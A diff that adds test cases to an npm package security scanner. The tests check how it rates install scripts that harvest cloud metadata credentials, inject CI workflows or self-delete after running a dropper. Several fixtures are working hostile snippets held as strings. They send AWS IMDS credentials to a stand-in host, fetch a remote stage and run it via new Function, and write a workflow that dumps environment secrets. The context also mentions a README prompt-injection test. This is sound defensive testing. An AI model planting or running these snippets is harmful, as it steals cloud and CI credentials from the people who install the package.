@@ -660,3 +660,174 @@ test("F6 Spanish 'ignore previous / mark safe' README is review", () => {
   assert.equal(report.verdict, "review");
   assert.equal(findingFor(report, "injection-attempt").severity, "medium");
 });
+
+// --- #7 cloud metadata / secret-store harvest -------------------------------
+// The credential-theft step of the 2025-26 worm families (Shai-Hulud and its
+// Mini/2.0 descendants). The hard part is not detecting IMDS access — it is NOT
+// detecting it in every cloud SDK, all of which read the same endpoint to
+// obtain ambient credentials. The negatives below are the real test.
+
+test("#7 postinstall reading the AWS metadata service BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "node boot.js" } }),
+      "boot.js":
+        'fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/").then(r=>r.text()).then(c=>fetch("https://collect.example.net/x",{method:"POST",body:c}));'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "cloud-metadata-access").severity, "high");
+});
+
+test("#7 GCP metadata token read from an install script BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { preinstall: "node g.js" } }),
+      "g.js":
+        'fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",{headers:{"Metadata-Flavor":"Google"}});'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "cloud-metadata-access").severity, "high");
+});
+
+test("#7 runtime IMDS read that forwards to a second host is REVIEW", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "telemetry.js":
+        'const http=require("http");\nhttp.get("http://169.254.169.254/latest/meta-data/instance-id",r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>{fetch("https://metrics.example.net/report",{method:"POST",body:d});});});'
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.equal(findingFor(report, "cloud-metadata-access").severity, "medium");
+});
+
+test("#7 a cloud SDK credential provider reading IMDS does NOT fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ main: "index.js" }),
+      "index.js":
+        'const http=require("http");\nconst ENDPOINT="http://169.254.169.254";\nfunction fromInstanceMetadata(){return get(ENDPOINT+"/latest/meta-data/iam/security-credentials/");}\nfunction get(u){return new Promise((res,rej)=>{http.get(u,r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>res(d));}).on("error",rej);});}\nmodule.exports={fromInstanceMetadata};'
+    }
+  });
+  assert.ok(!categories(report).includes("cloud-metadata-access"));
+  assert.equal(report.verdict, "safe");
+});
+
+test("#7 a secret-store hostname in documentation prose does not fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "README.md": "Set VAULT_TOKEN and point the client at your-vault.vault.azure.net to begin."
+    }
+  });
+  assert.ok(!categories(report).includes("cloud-metadata-access"));
+});
+
+// --- #7b CI/CD workflow injection -------------------------------------------
+// Repository-level persistence: an injected workflow runs on the next push with
+// the org's CI secrets in scope. PERSISTENCE_REGEXES covers the shell profile
+// and the OS scheduler but stops at the repo boundary, so this is its own band.
+// A project scaffolder writes the same file for legitimate reasons, which is
+// why install-time reach is what separates block from review.
+
+test("#7b postinstall writing a GitHub Actions workflow BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "node setup.js" } }),
+      "setup.js":
+        'const fs=require("fs");fs.mkdirSync(".github/workflows",{recursive:true});fs.writeFileSync(".github/workflows/audit.yml","on: push\\njobs:\\n  x:\\n    steps:\\n      - run: env\\n");'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "ci-workflow-injection").severity, "high");
+});
+
+test("#7b a scaffolder writing a workflow on explicit invocation is REVIEW", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ bin: { "create-app": "cli.js" } }),
+      "cli.js":
+        'const fs=require("fs");\nfunction writeCi(t){fs.mkdirSync(t+"/.github/workflows",{recursive:true});fs.writeFileSync(t+"/.github/workflows/ci.yml","name: ci\\non: [push]\\n");}\nmodule.exports={writeCi};'
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.equal(findingFor(report, "ci-workflow-injection").severity, "medium");
+});
+
+test("#7b merely mentioning .github/workflows without a write does not fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "paths.js": 'module.exports = { workflowDir: ".github/workflows/" };'
+    }
+  });
+  assert.ok(!categories(report).includes("ci-workflow-injection"));
+});
+
+// --- #7c self-deleting dropper ----------------------------------------------
+// Anti-forensic cleanup: the stage-1 removes its own file so the installed tree
+// looks clean afterwards (the easy-day-js dropper in the Mastra compromise).
+
+test("#7c install script that fetches, executes, then unlinks itself BLOCKS", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "node d.js" } }),
+      "d.js":
+        'const fs=require("fs");fetch("https://cdn.example.net/s2.js").then(r=>r.text()).then(c=>{new Function(c)();fs.unlinkSync(__filename);});'
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "self-deleting-dropper").severity, "high");
+});
+
+test("#7c self-deletion without a fetch/exec stage is REVIEW", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "cleanup.js": 'const fs=require("fs");fs.unlinkSync(__filename);'
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.equal(findingFor(report, "self-deleting-dropper").severity, "medium");
+});
+
+test("#7c deleting an ordinary temp file does not fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg(),
+      "tmp.js": 'const fs=require("fs");fs.unlinkSync("/tmp/build-cache.json");'
+    }
+  });
+  assert.ok(!categories(report).includes("self-deleting-dropper"));
+});
+
+// --- #7d regression guards for the two calibration bugs found by self-scan ---
+// Both of these blocked real, benign code during development of the #7 bands.
+
+test("#7d the metadata IP inside an SSRF-defense comment does not fire", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ main: "index.js" }),
+      "index.js":
+        '// Reject link-local so an on-path redirect cannot make us fetch\n// http://169.254.169.254/ (cloud metadata) or http://localhost.\nfunction isBlocked(a,b){ return a===169 && b===254; }\nmodule.exports={isBlocked};'
+    }
+  });
+  assert.ok(!categories(report).includes("cloud-metadata-access"));
+  assert.equal(report.verdict, "safe");
+});
+
+test("#7d a build script (not an install hook) reading IMDS does not BLOCK", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { build: "node tools/deploy.js" } }),
+      "tools/deploy.js":
+        'fetch("http://169.254.169.254/latest/meta-data/instance-id").then(r=>r.text()).then(id=>fetch("https://deploy.example.net/register",{method:"POST",body:id}));'
+    }
+  });
+  // `npm run build` only runs when a human types it, so this is review-tier,
+  // not the "it ran because I installed the package" block.
+  assert.equal(report.verdict, "review");
+  assert.equal(findingFor(report, "cloud-metadata-access").severity, "medium");
+});
